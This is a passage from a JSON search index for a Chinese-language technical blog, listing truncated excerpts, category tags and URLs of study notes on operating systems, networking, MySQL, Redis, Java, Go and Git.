$a","lvl0":"Linux基础","lvl1":["软件和系统"],"lvl2":"摘要","objectID":"13b34e93310745555b41169c5e1365de","tags":[""],"url":"https://lyr-2000.github.io/post/05.%E8%BD%AF%E4%BB%B6%E5%92%8C%E7%B3%BB%E7%BB%9F/02.%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/01.linux%E5%9F%BA%E7%A1%80/"},{"content":"Linux IO模式 linux有下面五种网络模式 阻塞 I/O（blocking IO） 默认socket就是阻塞IO，当用户进程调用了recvfrom这个系","lvl0":"IO管理","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"431b31cd6da94ba077b34a87360f6b79","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/5.io%E7%AE%A1%E7%90%86/"},{"content":"CPU cache结构和缓存一致性（MESI协议） 在多核CPU中，内存中的数据会在多个核心中存在数据副本，某一个核心发生修改操作，就产生了数据不一","lvl0":"互斥和同步","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"48f526c864db4f13b5f0367e1c44efc2","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5/"},{"content":"七层模型 五层模型 网络协议三要素 语法：即数据与控制信息的结构或格式。 语义：即需要发出何种控制信息，完成何种动作以及做出何种响应。 同步：即事件实","lvl0":"体系结构","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"92a8663a1ea2e2d7534d45cfe946c8a0","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"content":"基本概念 内存分页和内存分段 内存分页分为一个页号还有一个偏移量，我们通过页号查找页表，找出对应地址，然后加上偏移量就可以得到最终地址 内存分段的","lvl0":"内存管理","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"8c38a62fba6c1ee0afe0eb0980f3612d","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/4.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"content":"HTTP协议特点 HTTP和HTTPS的区别 端口不同：HTTP使用的是80端口，HTTPS使用443端口； HTTP认证机制，更加安全； HTTP","lvl0":"应用层(HTTP,SMTP)","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"516ad3ebcd543cbae50b348ae0fa7c20","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82httpsmtp/"},{"content":"基本概念 产生死锁的原因 根本原因 就是系统能够提供的资源个数比要求该资源的进程数要少 基本原因 资源竞争和进程推进顺序不合理 产生死锁必要条件 互斥 一个","lvl0":"死锁和饥饿","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"c4cdefafdb0ef7195de61191f83eec4f","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/3.%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/"},{"content":"硬件层分为物理层和数据链路层 三种通讯方式 通信的三种基本方式：单工、半双工、双工 物理层几大特性 （1） 机械特性：指明接口所用接线器的形状和尺寸、","lvl0":"硬件层","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"131fd0138fb2094d5845a7fdcbe5bd5b","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E7%A1%AC%E4%BB%B6%E5%B1%82/"},{"content":"ARP协议和ARP攻击 arp 协议的全称 arp协议： address resolution protocol , 地址解析协议 resolve : 解析的意思 ARP协议完成了IP地址与物理地址的映射。每一个主机都设有一","lvl0":"网络层(IP,ICMP,ARP)","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"893e9cbc7aa9b831fcc4ce75808be267","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82ipicmparp/"},{"content":"TCP的三次握手 问题1 TCP可以建立两次握手嘛 不可以。有两个原因：首先，可能会出现已失效的连接请求报文段又传到了服务器端。 其次，两次握手无法","lvl0":"运输层(TCP,UDP)","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"923062530747acf749f5b8bbb9efeaae","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E8%BF%90%E8%BE%93%E5%B1%82tcpudp/"},{"content":"基本概念 进程和线程的区别 进程：进程是系统进行资源分配和调度的一个独立单位，是系统中的并发执行的单位 线程：线程是进程的一个实体，也是 CPU 调度和分","lvl0":"进程和线程","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"1e8feff209812022022ce674e040974a","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/"},{"content":"SQL语句分为哪几类 数据定义语言DDL（Data Ddefinition Language）CREATE，DROP，ALTER 主要为以上操作 即对逻辑结构等有操作的，","lvl0":"SQL语句及优化","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"cd93aea976dfc93620659aa37b84f0e8","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/6.sql%E8%AF%AD%E5%8F%A5%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"content":"概念 事务是一个不可分割的数据库操作序列，也是数据库并发控制的基本单位，其执行的结果必须使数据库从一种一致性状态变到另一种一致性状态。事务是逻","lvl0":"事务和锁","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"2eeb4cc6102b41b64837977fc79a9a9b","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/4.%E4%BA%8B%E5%8A%A1%E5%92%8C%E9%94%81/"},{"content":"分布式锁 在日常情况下在进程或线程中我们可以使用 synchronized 、Lock 实现并发编程，但是我， 如何在分布式集群下使用呢？可以使用 Redisson ， Zookeeper ，Redis本身 分布","lvl0":"分布式锁，过期策略，淘汰规则","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"682d5850af17008de399b270e8d6f18f","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/5.-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E8%BF%87%E6%9C%9F%E7%AD%96%E7%95%A5%E6%B7%98%E6%B1%B0%E8%A7%84%E5%88%99/"},{"content":"为什么Redis速度那么快 基于内存实现 数据结构高效，底层多种数据结构支持不同的数据类型，比如HyperLogLog它连2个字节都不想浪费 提供","lvl0":"原理","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"c7939badb3818a597eb27224f1e10d69","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/3.%E5%8E%9F%E7%90%86/"},{"content":"缓存雪崩 Redis中大批量key在同一时间同时失效导致所有请求都打到了MySQL。而MySQL扛不住导致大面积崩塌 解决方案 缓存数据的过期时间","lvl0":"常见问题","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"bea6ce0491b1a62259717ec4ee15ff9f","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/4.%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"},{"content":"常考的主要分为InnoDB，MyISAM 主要区别 InnoDB引擎的4大特性 插入缓冲（insert buffer) 二次写(double write) 自适应哈希索引(ah","lvl0":"引擎","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"0ce5397bdcb08b44324ec6fec16314b2","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/2.%E5%BC%95%E6%93%8E/"},{"content":"包括 RDB 和 AOF 两种机制，下面分别进行说明 RDB RDB 持久化机制，是对 Redis 中的数据执行周期性的持久化。更适合做冷备。 优点： 压缩后的二进制文，适用于备份、全量","lvl0":"持久化","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"0db2b97f2960e902d5eace9d17aa3c45","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/2.%E6%8C%81%E4%B9%85%E5%8C%96/"},{"content":"数据库三大范式 第一范式（属性不可再分） 如果数据库表中的所有字段值都是不可分解的原子值，就说明该数据库表满足了第一范式。 第二范式（每个非主属性","lvl0":"数据库基础","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"34553994eaecee40ac7e705c86fb1782","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/1.%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"},{"content":"本文参考：硬核Redis总结，看这篇就够了！ (qq.com) 8大基本数据类型 String 适用于简单key-value存储、setnx key value实现分布式锁、计数器","lvl0":"数据类型","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"343f0d0ed5d9ecb4acd36096e4498547","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/1.%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"content":"概念 索引是一种特殊的文件(InnoDB数据表上的索引是表空间的一个组成部分)，它们包含着对数据表里所有记录的引用指针。 索引是一种数据结构。数","lvl0":"索引","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"82d1010c7f524f667310c136c7b3bb33","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/3.%E7%B4%A2%E5%BC%95/"},{"content":"什么是视图 所谓视图，本质上是一种虚拟表，在物理上是不存在的，其内容与真实的表相似，包含一系列带有名称的列和行数据。但是，视图并不在数据库中以","lvl0":"视图，存储过程，函数，触发器","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"03508ca621da1e18e20463ed009b9500","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/5.%E8%A7%86%E5%9B%BE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%87%BD%E6%95%B0%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"content":"Redis有下面四种部署方式 模式 优点 缺点 单机版 架构简单，部署方便 机器故障、容量瓶颈、QPS瓶颈 主从复制 高可靠性，读写分离 故障恢复复杂，主库的","lvl0":"集群和限流","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"be3e6bef78b83ecfdbb3a1b955a3a1cf","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/6.%E9%9B%86%E7%BE%A4%E5%92%8C%E9%99%90%E6%B5%81/"},{"content":"这里主要涉及到IO多路复用 基本概念介绍 BIO 同步并阻塞，服务器实现模式为一个连接一个线程，即客户端有连接请求时服务器端就需要启动一个线程进行处理","lvl0":"IO NIO框架","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"20b0cd1aadbf5a7c32d27fc7b0ca1051","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/5.io-nio%E6%A1%86%E6%9E%B6/"},{"content":"java语言的特性 Lambda表达式和函数式接口 最简单的lambda表达式如下 1 Arrays.asList( \u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;d\u0026#34; ).forEach( e -\u0026gt; System.out.println( e ) ); 当然，为了显式说明某个接口是函数式接口","lvl0":"java8特性","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"fec1e22ec031b91cbe9ae2742cfba30c","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/10.java8%E7%89%B9%E6%80%A7/"},{"content":"return和finally的执行顺序 finally语句在return语句执行之后return返回之前执行的，所以我们先执行return的语","lvl0":"java基础","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"128cc804c2dd57737d4d84e641121e3a","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/1.java%E5%9F%BA%E7%A1%80/"},{"content":"JVM内存模型 这里主要还是会问一些Java的内存模型，1.8之前和之后的内存模型是不一样的 简单说一下每个部分是干嘛的吧 程序计数器 用于记录程序","lvl0":"JVM模型","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"dba1a1d62b1a46b90e3e15ed027c9539","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/6.jvm%E6%A8%A1%E5%9E%8B/"},{"content":"这里主要包括插件系统以及代码生成这两个部分，鉴于面试应该不会问这个问题，所以我就不写了","lvl0":"元编程","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"8cc87b0e5f76d976b9326569b21d5ca5","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/7.%E5%85%83%E7%BC%96%E7%A8%8B/"},{"content":"内存分配 程序中的数据和变量都会被分配到程序所在的虚拟内存中，内存空间包含两个重要区域：栈区（Stack）和堆区（Heap）。函数调用的参数、","lvl0":"内存管理","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"8c7b94bda4cac7efe180f53b2ba594db","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/6.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"content":"","lvl0":"参数调优","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"3791ff405dc05647fb1486c133352b2c","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/9.%E5%8F%82%E6%95%B0%E8%B0%83%E4%BC%98/"},{"content":"判断对象是否是垃圾 引用计数算法：判断对象的引用数量 每引用一次就+1，当一个对象实例的某个引用超过了生命周期或者被设置为一个新值时，对象实例的","lvl0":"垃圾回收","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"c7f6f4d108288c9c657cd8e208b73ede","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/8.%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"content":"for和range for循环的三种用法 for range用于遍历切片，数组或者map 几个用法 使用 for range a {} 遍历数组和切片，不关心索引和数据的情况； 使","lvl0":"常用关键字","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"6560e1901a6a172d7e9e93204cee4376","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/4.%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97/"},{"content":"并发框架，其实也叫 JUC 即 java.util.concurrent 包，分为（锁框架、原子类框架、同步器框架、集合框架、执行器框架） 线程创建方式 继承Thread类重写run方法 1 2 3 4","lvl0":"并发框架(JUC)","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"cab1c726434edd7e0a483706e89387f0","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/4.%E5%B9%B6%E5%8F%91%E6%A1%86%E6%9E%B6juc/"},{"content":"上下文context 这东西是用于控制并发的。下面是一个简单的例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38","lvl0":"并发编程","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"73f5a851baaa71ee040187c89e6d3e4b","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/5.%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"},{"content":"数据类型 数据类型占用的字节数 整数 int 64位操作系统默认为int64,32位操作系统为int32,但是类型检查时时int int8 (byte 1字节) int16 (short 2字节)","lvl0":"数据结构","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"443a2ee585f83233f04e1b2f9b9c3e5b","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/2.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"JSON 序列化和反序列化 go的序列化大部分指的是把结构体转换为json数据，在序列化的时候要注意变量名必须要大写，小写字母开头的变量是不会被序列化","lvl0":"标准库","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"2ff35549a127ffaa6a647ae2be810d4f","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/8.%E6%A0%87%E5%87%86%E5%BA%93/"},{"content":"类加载流程 只需要记住下面这5个阶段就行了 参考：JVM 基础 - Java 类加载机制 | Java 全栈知识体系 (pdai.tech) 下面简单介绍一下每个部分做了啥 加载 首先获取二进制流，","lvl0":"类加载机制","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"67f366c72746e5662f2c09c76ed1d3af","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/7.%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"},{"content":"基本概念 抽象语法树 是源代码语法的结构的一种抽象表示，它用树状的方式表示编程语言的语法结构1。抽象语法树中的每一个节点都表示源代码中的一个元素","lvl0":"编译原理","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"225fd3b2e3241678de2b9dcfc9b458a2","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/1.%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"content":"函数调用 这里面涉及的东西其实挺深的，所以等我后面又时间再去研究 Go 中函数传参仅有值传递一种方式； slice、map、channel都是引用类型","lvl0":"语言基础","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"6b5d9317927390326c5048e3e45b36de","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/3.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"content":"集合框架也可以叫容器。（集合是用于存储数据的容器） 常问的有下面几个 ArrayList LinkList HashSet TreeSet HashMap List(对付顺序的好帮手)： 存储的元素是有序的、可重复的。 Se","lvl0":"集合框架","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"1a515a2d0134df852e1c2c46e4399322","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/3.%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/"},{"content":"这个部分主要以面试题为主 京东面试题 是equals而不是equal，单词错了 类和对象 面向对象和面向过程的区别 面向过程 ：面向过程性能比面向对象高","lvl0":"面向对象","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"e7a742bca126ea37dabf0d90af9a61aa","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/2.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"JS设计模式总结笔记 开篇：前端工程师的成长论 能够决定一个前端工程师的本质的，不是那些瞬息万变的技术点，而是那些不变的东西。 所谓“不变的东西”","lvl0":"JS设计模式总结笔记","lvl1":["前端","学习笔记"],"lvl2":"摘要","objectID":"4c83bf0a3b9e65bc201cfed5c2841e19","tags":["设计模式"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/50.js%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/"},{"content":"","lvl0":"Git命令思维导图","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"359a8cdf72b4062f6bf0d94bf12f18bc","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.%E6%89%8B%E5%86%8C/06.git%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"},{"content":"Git分支-分支原理 Git 处理分支的方式可谓是难以置信的轻量，创建新分支这一操作几乎能在瞬间完成，并且在不同分支之间的切换操作也是一样便捷。 与许","lvl0":"Git分支-分支原理","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"cb7c3da146608f94c41cf814be452367","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/20.git%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E5%8E%9F%E7%90%86/"},{"content":"Git分支-变基 在 Git 中整合来自不同分支的修改主要有两种方法：merge 以及 rebase。 在本节中我们将学习什么是“变基”，怎样使用“变基”，","lvl0":"Git分支-变基","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"a68e1156adc8ef3e8e3fa76abfabd1a3","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/70.git%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA/"},{"content":"Git分支-远程分支 远程引用是对远程仓库的引用（指针），包括分支、标签等等。 远程分支本质上也是一个指针，指向远程地址 查看远程引用列表与信息 1","lvl0":"Git分支-远程分支","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"c0a341136f813e6f2f759aabff27cb7d","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/60.git%E5%88%86%E6%94%AF-%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/"},{"content":"Git分支开发工作流 文档：Git分支开发工作流 长期分支 因为 Git 使用简单的三方合并，所以就算在一段较长的时间内，反复把一个分支合并入另一个分支，","lvl0":"Git分支开发工作流","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"90fe8a5f5de5dc4de7f356b2c1a39830","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/50.git%E5%88%86%E6%94%AF%E5%BC%80%E5%8F%91%E5%B7%A5%E4%BD%9C%E6%B5%81/"},{"content":"Git分支的新建与合并-分支操作 文档：Git 分支 - 分支的新建与合并 创建分支并切换 此时有一个需求需要在新的分支iss53上工作： 1 $ git checkout -b iss53 #","lvl0":"Git分支的新建与合并-分支操作","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"965d5bf3a8ff6b56b17eab05e9b2b9c3","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/30.git%E5%88%86%E6%94%AF%E7%9A%84%E6%96%B0%E5%BB%BA%E4%B8%8E%E5%90%88%E5%B9%B6-%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/"},{"content":"Git分支管理-查看分支 查看分支 1 2 3 4 $ git branch iss53 * master # 带星号*表示当前所在分支 testing git branch 命令不只是可以创建与删除分支。 如果不加任何参数运行它，会","lvl0":"Git分支管理-查看分支","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"01ce0dc5746ace2725230b583d8936ae","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/40.git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86-%E6%9F%A5%E7%9C%8B%E5%88%86%E6%94%AF/"},{"content":"rebase分支合并 说明 以下 v2 是某个需求的开发分支， dev是总的开发分支，v2 是基于dev分支签出的。 当完成v2的开发后，需要把代码合并到d","lvl0":"Git变基合并","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"b383bb8812f621112427d33ec9f11ba2","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.%E6%89%8B%E5%86%8C/03.git%E5%8F%98%E5%9F%BA%E5%90%88%E5%B9%B6/"},{"content":"Git基础与命令 官方文档（中文）：https://git-scm.com/book/zh/v2 本文档是根据官方文档来编写的，以官方文档为准。","lvl0":"Git基础与命令","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"0529a46e3af2493c28cd32919582af70","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/10.git%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%91%BD%E4%BB%A4/"},{"content":"Git工具-交互式暂存 本节中的几个交互式 Git 命令可以帮助你将文件的特定部分组合成提交。 当你在修改了大量文件后，希望这些改动能拆分为若干提交而不","lvl0":"Git工具-交互式暂存","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"499d7d56a43e1ab814d4eda82af5a7c3","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/90.git%E5%B7%A5%E5%85%B7-%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%9A%82%E5%AD%98/"},{"content":"Git工具-查看修订版本 Git 能够以多种方式来指定单个提交、一组提交、或者一定范围内的提交。 了解它们并不是必需的，但是了解一下总没坏处。 修订版本","lvl0":"Git工具-查看修订版本","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"832a09e27c5e212364dcdc27d8143200","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/80.git%E5%B7%A5%E5%85%B7-%E6%9F%A5%E7%9C%8B%E4%BF%AE%E8%AE%A2%E7%89%88%E6%9C%AC/"},{"content":"Git 工具 - 重写历史 许多时候，在使用 Git 时，你可能想要修订提交历史。 Git 很棒的一点是它允许你在最后时刻做决定。 你可以在将暂存区内容提交前决定哪些文件","lvl0":"Git工具-重写历史","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"4b9b7e5eff4a398d43eee9e9a29b8020","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/100.git%E5%B7%A5%E5%85%B7-%E9%87%8D%E5%86%99%E5%8E%86%E5%8F%B2/"},{"content":"Git 工具 - 重置揭密 在继续了解更专业的工具前，我们先探讨一下 Git 的 reset 和 checkout 命令。 在初遇的 Git 